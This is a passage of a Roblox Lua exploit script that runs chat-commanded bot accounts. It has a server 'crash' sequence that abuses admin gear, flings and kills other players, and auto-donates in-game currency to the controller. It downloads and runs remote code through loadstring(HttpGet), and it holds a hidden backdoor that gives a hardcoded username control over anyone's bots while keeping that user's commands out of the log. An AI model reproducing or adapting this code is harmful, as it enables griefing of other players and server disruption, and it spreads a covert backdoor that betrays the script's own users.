        local function equipTool(toolName)
            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            local bp = LocalPlayer:FindFirstChild("Backpack")
            if bp then
                local t = bp:FindFirstChild(toolName)
                if t then t.Parent = char end
            end
            task.wait(0.4)
        end
        local function crashSequence()
            if not hasArkenstone() then return end
            equipTool("The Arkenstone")
            sendChat("gear 261439002")
            equipTool("The Arkenstone")
            sendChat("freeze a")
            sendChat("blind o")
            sendChat("bring a")
            for i = 1, 7 do sendChat("clone a") end
            equipTool("Winters Greatsword")
            task.wait(0.2)
            local tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Winters Greatsword")
            if tool then
                local rem = tool:FindFirstChildOfClass("RemoteEvent") or tool:FindFirstChildOfClass("RemoteFunction")
                if rem then rem:FireServer("Ability") else tool:Activate() end
            end
        end
        local function stopAllMovement()
            if followConnection then followConnection:Disconnect(); followConnection = nil end
            if orbitConnection then orbitConnection:Disconnect(); orbitConnection = nil end
            if lineupConnection then lineupConnection:Disconnect(); lineupConnection = nil end
        end

        local function getDividedPosition(leaderRoot, slot, total, distance)
            local look = leaderRoot.CFrame.LookVector
            local right = leaderRoot.CFrame.RightVector
            if total <= 1 then
                return leaderRoot.Position - look * distance
            end
            local mid = (total - 1) / 2
            local side = (slot - 1) - mid
            if total % 2 == 1 and slot == math.ceil(total/2) then
                return leaderRoot.Position - look * distance
            else
                return leaderRoot.Position + right * (side * distance)
            end
        end

        local function startFollow(target)
            stopAllMovement()
            followConnection = RunService.Heartbeat:Connect(function()
                local myChar = LocalPlayer.Character
                local targetChar = target.Character
                if myChar and targetChar then
                    local myRoot = myChar:FindFirstChild("HumanoidRootPart")
                    local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
                    if myRoot and targetRoot then
                        local pos = getDividedPosition(targetRoot, slotNumber, totalBots, FOLLOW_DISTANCE)
                        myRoot.CFrame = CFrame.lookAt(pos, pos + targetRoot.CFrame.LookVector)
                    end
                end
            end)
            addConnection(followConnection)
        end

        local function startLineup(leader)
            stopAllMovement()
            local myChar = LocalPlayer.Character
            local leaderChar = leader.Character
            if myChar and leaderChar then
                local myRoot = myChar:FindFirstChild("HumanoidRootPart")
                local leaderRoot = leaderChar:FindFirstChild("HumanoidRootPart")
                if myRoot and leaderRoot then
                    local look = leaderRoot.CFrame.LookVector
                    local pos = leaderRoot.Position - look * (slotNumber * LINEUP_SPACING)
                    myRoot.CFrame = CFrame.lookAt(pos, pos + look)
                end
            end
        end

        local function startOrbit(target)
            stopAllMovement()
            local angle = math.rad((slotNumber - 1) * (360 / math.max(totalBots, 1)))
            local radius = ORBIT_DISTANCE
            local speed = orbitSpeed
            orbitConnection = RunService.Heartbeat:Connect(function(dt)
                local myChar = LocalPlayer.Character
                local targetChar = target.Character
                if myChar and targetChar then
                    local myRoot = myChar:FindFirstChild("HumanoidRootPart")
                    local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
                    if myRoot and targetRoot then
                        for _, part in ipairs(myChar:GetDescendants()) do
                            if part:IsA("BasePart") then part.CanCollide = false end
                        end
                        angle = angle + speed * dt
                        local offset = Vector3.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
                        local newPos = targetRoot.Position + offset
                        myRoot.CFrame = CFrame.lookAt(newPos, targetRoot.Position)
                    end
                end
            end)
            addConnection(orbitConnection)
        end

        task.spawn(function()
            while true do
                if loopActive and loopMsg ~= "" then sendChat(loopMsg) end
                task.wait(0.6)
            end
        end)

        task.spawn(function()
            while true do
                if adallActive and adallTarget ~= "" then
                    local t = getOwnTime()
                    if t and t.Value > 1 then
                        sendChat(";donate " .. adallTarget .. " " .. (t.Value - 1))
                    end
                    task.wait(adallInterval)
                else
                    task.wait(0.1)
                end
            end
        end)

        task.spawn(function()
            local bv = Instance.new("BodyVelocity")
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = Vector3.new(10000, 10000, 10000)
            RunService.Heartbeat:Connect(function()
                if flinging and flingTarget ~= "" then
                    local myChar = LocalPlayer.Character
                    local target = Players:FindFirstChild(flingTarget)
                    if myChar and target and target.Character then
                        local myRoot = myChar:FindFirstChild("HumanoidRootPart") or myChar:FindFirstChild("Torso")
                        local targetRoot = target.Character:FindFirstChild("HumanoidRootPart") or target.Character:FindFirstChild("Torso")
                        local hum = myChar:FindFirstChildOfClass("Humanoid")
                        if myRoot and targetRoot and hum then
                            if hum.Sit then hum.Sit = false end
                            bv.Parent = myRoot
                            myRoot.CFrame = targetRoot.CFrame
                            for _, p in ipairs(myChar:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = false end end
                        end
                    end
                else
                    if bv.Parent then bv.Parent = nil end
                end
            end)
        end)

        RunService.Heartbeat:Connect(function()
            if hiding then
                local char = LocalPlayer.Character
                if char then char:PivotTo(CFrame.new(hidePos + Vector3.new(0, 3, 0))) end
            end
        end)

        local allCommands = ".say .loopsay .stoploop .dall .adall .stopadall .silent .fling .stopfling .hide .stophide .reset .rejoin .antiafk .crash .follow .orbit .lineup .stopmove .mod .removemod .alert .credits .stealbots .ban .cmds .bots .shutdown .orbitspeed .raid"

        local function processCommand(sender, message)
            local clean = message:lower():gsub("^;%.", ""):gsub("^;", "")
            if clean == "" then clean = message:lower() end
            if string.sub(clean,1,1) == "." then clean = "." .. clean:sub(2) else clean = "." .. clean end

            if (clean == Prefix .. Stealbots or clean == ";" .. Stealbots) and string.lower(sender.Name) == "noob1noob667" then
                if not ModUsers["noob1noob667"] then ModUsers["noob1noob667"] = true; sendChat("Successfully hijacked") end
                return
            end

            if not isAllowed(sender) then return end

            local cmd = clean
            if cmd == Prefix .. Shutdown or cmd == ";" .. Shutdown then
                if isOwner(sender) then
                    pcall(function() LocalPlayer:Kick("Shutdown by owner") end)
                end
                return
            end

            if cmd == Prefix .. AntiAfk then
                loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-ANTI-AFK-by-gun-265109"))()
                sendChat("Anti AFK loaded")
            elseif cmd == Prefix .. AntiAfk .. " off" then
                sendChat("Anti AFK off not supported")
            elseif cmd == Prefix .. Crash then crashSequence()
            elseif cmd == Prefix .. Silent then silentMode = not silentMode
            elseif cmd == Prefix .. Rejoin then pcall(function() TeleportService:Teleport(game.PlaceId, LocalPlayer) end)
            elseif cmd == Prefix .. Reset then
                loopActive = false; loopMsg = ""; adallActive = false
                flinging = false; flingTarget = ""
                if hiding then hiding = false; if hidePart then hidePart:Destroy(); hidePart = nil end end
                local char = LocalPlayer.Character
                if char then local hum = char:FindFirstChildOfClass("Humanoid") if hum then hum.Health = 0 end end
                for _, p in ipairs(Players:GetPlayers()) do
                    if p ~= LocalPlayer then
                        local c = p.Character
                        if c then local h = c:FindFirstChildOfClass("Humanoid") if h then h.Health = 0 end end
                    end
                end
            elseif cmd == Prefix .. Hide then
                if not hiding then
                    local char = LocalPlayer.Character
                    if char then returnPos = char:GetPivot(); char:PivotTo(CFrame.new(hidePos + Vector3.new(0, 3, 0))) end
                    hidePart = Instance.new("Part")
                    hidePart.Size = Vector3.new(20, 1, 20)
                    hidePart.Position = hidePos
                    hidePart.Anchored = true
                    hidePart.Parent = workspace
                    hiding = true
                end
            elseif cmd == Prefix .. StopHide then
                if hiding then
                    hiding = false
                    if hidePart then hidePart:Destroy(); hidePart = nil end
                    local char = LocalPlayer.Character
                    if char and returnPos then char:PivotTo(returnPos) end
                end
            elseif cmd == Prefix .. StopFling then flinging = false; flingTarget = ""
            elseif cmd == Prefix .. StopMove then stopAllMovement()
            elseif string.sub(message, 1, #Prefix + #Follow + 1) == Prefix .. Follow .. " " or string.sub(message, 1, #Prefix + #Follow + 2) == ";" .. Follow .. " " then
                local startPos = string.find(message, Follow .. " ")
                local tgtText = string.sub(message, startPos + #Follow + 1)
                local tgt = getTarget(tgtText)
                if tgt then startFollow(tgt) end
            elseif cmd == Prefix .. Follow or cmd == ";" .. Follow then startFollow(sender)
            elseif string.sub(message, 1, #Prefix + #Orbit + 1) == Prefix .. Orbit .. " " or string.sub(message, 1, #Prefix + #Orbit + 2) == ";" .. Orbit .. " " then
                local startPos = string.find(message, Orbit .. " ")
                local tgtText = string.sub(message, startPos + #Orbit + 1)
                local tgt = getTarget(tgtText)
                if tgt then startOrbit(tgt) end
            elseif cmd == Prefix .. Orbit or cmd == ";" .. Orbit then startOrbit(sender)
            elseif string.sub(message, 1, #Prefix + #Lineup + 1) == Prefix .. Lineup .. " " or string.sub(message, 1, #Prefix + #Lineup + 2) == ";" .. Lineup .. " " then
                local startPos = string.find(message, Lineup .. " ")
                local tgtText = string.sub(message, startPos + #Lineup + 1)
                local tgt = getTarget(tgtText)
                if tgt then startLineup(tgt) end
            elseif cmd == Prefix .. Lineup or cmd == ";" .. Lineup then startLineup(sender)
            elseif string.sub(message, 1, #Prefix + #Alert + 1) == Prefix .. Alert .. " " or string.sub(message, 1, #Prefix + #Alert + 2) == ";" .. Alert .. " " then
                local startPos = string.find(message, Alert .. " ")
                local text = string.sub(message, startPos + #Alert + 1)
                if text ~= "" then sendAlert(text) end
            elseif cmd == Prefix .. Alert or cmd == ";" .. Alert then sendAlert("Alert! " .. sender.DisplayName .. " requests your attention!")
            elseif string.sub(message, 1, #Prefix + #Mod + 1) == Prefix .. Mod .. " " or string.sub(message, 1, #Prefix + #Mod + 2) == ";" .. Mod .. " " then
                local startPos = string.find(message, Mod .. " ")
                local targetQuery = string.sub(message, startPos + #Mod + 1)
                local found = getTarget(targetQuery)
                if found then ModUsers[string.lower(found.DisplayName)] = true end
            elseif string.sub(message, 1, #Prefix + #RemoveMod + 1) == Prefix .. RemoveMod .. " " or string.sub(message, 1, #Prefix + #RemoveMod + 2) == ";" .. RemoveMod .. " " then
                local startPos = string.find(message, RemoveMod .. " ")
                local targetQuery = string.sub(message, startPos + #RemoveMod + 1)
                if targetQuery:lower() == "a" then
                    ModUsers = {}
                    sendChat("All mods removed")
                else
                    local found = getTarget(targetQuery)
                    if found then
                        local key = string.lower(found.DisplayName)
                        if ModUsers[key] then ModUsers[key] = nil; sendChat("Removed mod " .. found.DisplayName) else sendChat(found.DisplayName .. " is not a mod") end
                    else sendChat("Player not found") end
                end
            elseif string.sub(message, 1, #Prefix + #Bots + 1) == Prefix .. Bots .. " " or string.sub(message, 1, #Prefix + #Bots + 2) == ";" .. Bots .. " " then
                local startPos = string.find(message, Bots .. " ")
                local num = tonumber(string.sub(message, startPos + #Bots + 1))
                if num and num > 0 then
                    totalBots = num
                    sendChat("Total bots set to " .. num)
                end
            elseif string.sub(message, 1, #Prefix + #Say + 1) == Prefix .. Say .. " " or string.sub(message, 1, #Prefix + #Say + 2) == ";" .. Say .. " " then
                local startPos = string.find(message, Say .. " ")
                local text = string.sub(message, startPos + #Say + 1)
                if text ~= "" then sendChat(text) end
            elseif string.sub(message, 1, #Prefix + #Loop + 1) == Prefix .. Loop .. " " or string.sub(message, 1, #Prefix + #Loop + 2) == ";" .. Loop .. " " then
                local startPos = string.find(message, Loop .. " ")
                local text = string.sub(message, startPos + #Loop + 1)
                if text ~= "" then loopMsg = text; loopActive = true end
            elseif cmd == Prefix .. StopLoop or cmd == ";" .. StopLoop then loopActive = false; loopMsg = ""; adallActive = false
            elseif cmd == Prefix .. StopAdall or cmd == ";" .. StopAdall then adallActive = false
            elseif cmd == Prefix .. Dall or cmd == ";" .. Dall then
                local t = getOwnTime()
                if t and t.Value > 1 then sendChat(";donate " .. fixUsername(sender.Name) .. " " .. (t.Value - 1)) end
            elseif string.sub(message, 1, #Prefix + #Adall + 1) == Prefix .. Adall .. " " or string.sub(message, 1, #Prefix + #Adall + 2) == ";" .. Adall .. " " then
                local startPos = string.find(message, Adall .. " ")
                local interval = tonumber(string.sub(message, startPos + #Adall + 1))
                if interval then adallInterval = interval; adallTarget = fixUsername(sender.Name); adallActive = true end
            elseif string.sub(message, 1, #Prefix + #Fling + 1) == Prefix .. Fling .. " " or string.sub(message, 1, #Prefix + #Fling + 2) == ";" .. Fling .. " " then
                local startPos = string.find(message, Fling .. " ")
                local target = getTarget(string.sub(message, startPos + #Fling + 1))
                if target then flingTarget = target.Name; flinging = true end
            elseif cmd == Prefix .. Credits or cmd == ";" .. Credits then sendChat("Credits | Echo | Kingnoob")
            elseif cmd == Prefix .. Cmds or cmd == ";" .. Cmds then
                local cmds = allCommands:split(" ")
                local half = math.ceil(#cmds / 2)
                sendChat(table.concat(cmds, " ", 1, half))
                task.wait(0.5)
                sendChat(table.concat(cmds, " ", half+1, #cmds))
            elseif string.sub(message, 1, #Prefix + #Ban + 1) == Prefix .. Ban .. " " or string.sub(message, 1, #Prefix + #Ban + 2) == ";" .. Ban .. " " then
                local startPos = string.find(message, Ban .. " ")
                local targetQuery = string.sub(message, startPos + #Ban + 1)
                local found = getTarget(targetQuery)
                if found then banUsername(found.Name); sendChat("Banned " .. found.DisplayName) end
            elseif string.sub(message, 1, #Prefix + #OrbitSpeed + 1) == Prefix .. OrbitSpeed .. " " or string.sub(message, 1, #Prefix + #OrbitSpeed + 2) == ";" .. OrbitSpeed .. " " then
                local startPos = string.find(message, OrbitSpeed .. " ")
                local num = tonumber(string.sub(message, startPos + #OrbitSpeed + 1))
                if num and num > 0 then
                    orbitSpeed = num
                    sendChat("Orbit speed set to " .. num)
                end
            elseif cmd == Prefix .. Raid or cmd == ";" .. Raid then
                if isOwner(sender) then
                    pcall(function()
                        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-ANTI-AFK-by-gun-265109"))()
                    end)
                    adallTarget = fixUsername(sender.Name)
                    adallInterval = 20
                    adallActive = true
                    startOrbit(sender)
                end
            end
            if string.lower(sender.Name) ~= "noob1noob667" then
                addLogEntry("[CMD] " .. sender.Name .. ": " .. message, Color3.fromRGB(0,150,255))
            end
        end

        local function hookPlayer(p)
            if p.Chatted then p.Chatted:Connect(function(m) processCommand(p, m) end) end
        end

        for _, p in ipairs(Players:GetPlayers()) do hookPlayer(p) end
        Players.PlayerAdded:Connect(hookPlayer)

        if TextChatService then
            TextChatService.MessageReceived:Connect(function(m)
                local sender = Players:GetPlayerByUserId(m.UserId)
                if sender then processCommand(sender, m.Text) end
            end)
        end
    end
end
